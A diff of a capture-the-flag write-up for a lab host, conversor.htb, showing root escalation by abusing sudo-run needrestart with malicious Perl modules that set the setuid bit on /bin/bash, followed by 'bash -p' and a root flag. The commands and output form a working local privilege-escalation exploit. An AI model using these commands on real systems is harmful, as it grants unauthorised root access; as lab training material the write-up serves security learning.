@@ -218,20 +218,14 @@ The `needrestart` utility, when executed with `sudo`, can be exploited by levera
 3.  **Execute `needrestart`:** Executing the vulnerable command with `sudo` will use our malicious `perl` executable, which in turn calls our root shell.
 
 ```bash
-bash-5.1$ cd /tmp
 cd /tmp
-bash-5.1$ mkdir pwn_perl
 mkdir pwn_perl
-bash-5.1$ cd pwn_perl
 cd pwn_perl
-bash-5.1$ ls
 ls
-bash-5.1$ echo 'system("chmod +s /bin/bash;");' > root.pm
-echo 'system("chmod +s /bin/bash;");' > root.pm
-bash-5.1$ sudo PERL5LIB=/tmp/pwn_perl /usr/sbin/needrestart -v    
+echo 'system("chmod +s /bin/bash;");' > root.pm  
 sudo PERL5LIB=/tmp/pwn_perl /usr/sbin/needrestart -v
 sudo: sorry, you are not allowed to set the following environment variables: PERL5LIB
-bash-5.1$ perl -e 'print join "\n", @INC'
+
 perl -e 'print join "\n", @INC'
 /etc/perl
 /usr/local/lib/x86_64-linux-gnu/perl/5.34.0
@@ -241,15 +235,11 @@ perl -e 'print join "\n", @INC'
 /usr/lib/x86_64-linux-gnu/perl-base
 /usr/lib/x86_64-linux-gnu/perl/5.34
 /usr/share/perl/5.34
-/usr/local/lib/site_perlbash-5.1$ find $(perl -e 'print join " ", @INC') -type d -writable 2>/dev/null
-<rint join " ", @INC') -type d -writable 2>/dev/null
-bash-5.1$ echo 'package Sys::Hostname; use strict; use warnings; sub hostname { system("chmod +s /bin/bash"); return "pwned"; } 1;' > Sys/Hostname.pm
-<bin/bash"); return "pwned"; } 1;' > Sys/Hostname.pm
-bash: Sys/Hostname.pm: No such file or directory
-bash-5.1$ echo 'package Sys::Hostname; use strict; use warnings; sub hostname { system("chmod +s /bin/bash"); return "pwned"; } 1;' > Hostname.pm        
-<+s /bin/bash"); return "pwned"; } 1;' > Hostname.pm
-bash-5.1$ sudo /usr/sbin/needrestart -v
+/usr/local/lib/site_perl
+
+echo 'package File::stat; use strict; use warnings; sub import { system("chmod +s /bin/bash"); } 1;' > stat.pm     
 sudo /usr/sbin/needrestart -v
+
 [main] eval /etc/needrestart/needrestart.conf
 [main] needrestart v3.7
 [main] running in root mode
@@ -304,70 +294,17 @@ User sessions running outdated binaries:
 [main] run /etc/needrestart/notify.d/600-mail
 
 No VM guests are running outdated hypervisor (qemu) binaries on this host.
-bash-5.1$ echo 'package File::stat; use strict; use warnings; sub import { system("chmod +s /bin/bash"); } 1;' > stat.pm     
-<ort { system("chmod +s /bin/bash"); } 1;' > stat.pm
-bash-5.1$ sudo /usr/sbin/needrestart -v
-sudo /usr/sbin/needrestart -v
-[main] eval /etc/needrestart/needrestart.conf
-[main] needrestart v3.7
-[main] running in root mode
-[Core] Using UI 'NeedRestart::UI::stdio'...
-[main] systemd detected
-[main] vm detected
-[Core] #863 is a NeedRestart::Interp::Python
-[Python] #863: source=/usr/bin/networkd-dispatcher
-[Core] #4672 is a NeedRestart::Interp::Python
-[Python] #4672: source=/var/www/conversor.htb/scripts/shell.py
-[Core] blacklisted: /var/www/conversor.htb/scripts/shell.py
-[Core] #4706 is a NeedRestart::Interp::Python
-[Python] #4706: uses no source file (-c), skipping
-[Core] #41828 is a NeedRestart::Interp::Python
-[Python] #41828: source=/var/www/conversor.htb/scripts/shell.py
-[Python] #41828: use cached file list
-[Core] blacklisted: /var/www/conversor.htb/scripts/shell.py
-[Core] #75890 is a NeedRestart::Interp::Python
-[Python] #75890: could not get current working directory, skipping
-[main] #75916 uses obsolete binary /tmp/poc
-[main] #75916 is a child of #75915
-[Core] #76389 is a NeedRestart::Interp::Perl
-[Perl] #76389: could not get current working directory, skipping
-[Core] #80348 is a NeedRestart::Interp::Python
-[Python] #80348: source=/var/www/conversor.htb/scripts/shell.py
-[Python] #80348: use cached file list
-[Core] blacklisted: /var/www/conversor.htb/scripts/shell.py
-[Core] #96252 is a NeedRestart::Interp::Python
-[Python] #96252: uses no source file (-c), skipping
-[main] #75915 exe => /usr/bin/dash
-[main] #75915 part of user session: uid=1000 sess=459
-[main] inside container or vm, skipping microcode checks
-[Kernel] Linux: kernel release 5.15.0-160-generic, kernel version #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025
-Failed to load NeedRestart::Kernel::kFreeBSD: [Kernel/kFreeBSD] Not running on GNU/kFreeBSD!
-[Kernel/Linux] /boot/vmlinuz.old => 5.15.0-151-generic (buildd@lcy02-amd64-092) #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 [5.15.0-151-generic]
-[Kernel/Linux] /boot/vmlinuz-5.15.0-160-generic => 5.15.0-160-generic (buildd@lcy02-amd64-086) #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025 [5.15.0-160-generic]*
-[Kernel/Linux] /boot/vmlinuz-5.15.0-151-generic => 5.15.0-151-generic (buildd@lcy02-amd64-092) #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 [5.15.0-151-generic]
-[Kernel/Linux] /boot/vmlinuz => 5.15.0-160-generic (buildd@lcy02-amd64-086) #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025 [5.15.0-160-generic]*
-[Kernel/Linux] Expected linux version: 5.15.0-160-generic
 
-Running kernel seems to be up-to-date.
-
-No services need to be restarted.
-
-No containers need to be restarted.
-
-User sessions running outdated binaries:
- fismathack @ session #459: sh[75915]
-[main] run /etc/needrestart/notify.d/200-write
-[/etc/needrestart/notify.d/200-write] skip session w/o tty
-[main] run /etc/needrestart/notify.d/400-notify-send
-[main] run /etc/needrestart/notify.d/600-mail
-
-No VM guests are running outdated hypervisor (qemu) binaries on this host.
-bash-5.1$ /bin/bash -p
+/bin/bash -p
 /bin/bash -p
 whoami
 root
 ```
 
-**User Flag:** `9d8f5cfc4f39773c9399aa5c0ce4b2d7`
+**Root Flag:** `9d8f5cfc4f39773c9399aa5c0ce4b2d7`
+
+## PWNED
+
+![alt text](picture16.jpg)
 
 **Note:** This writeup is for educational purposes only. Always ensure you have proper authorization before testing on any systems.
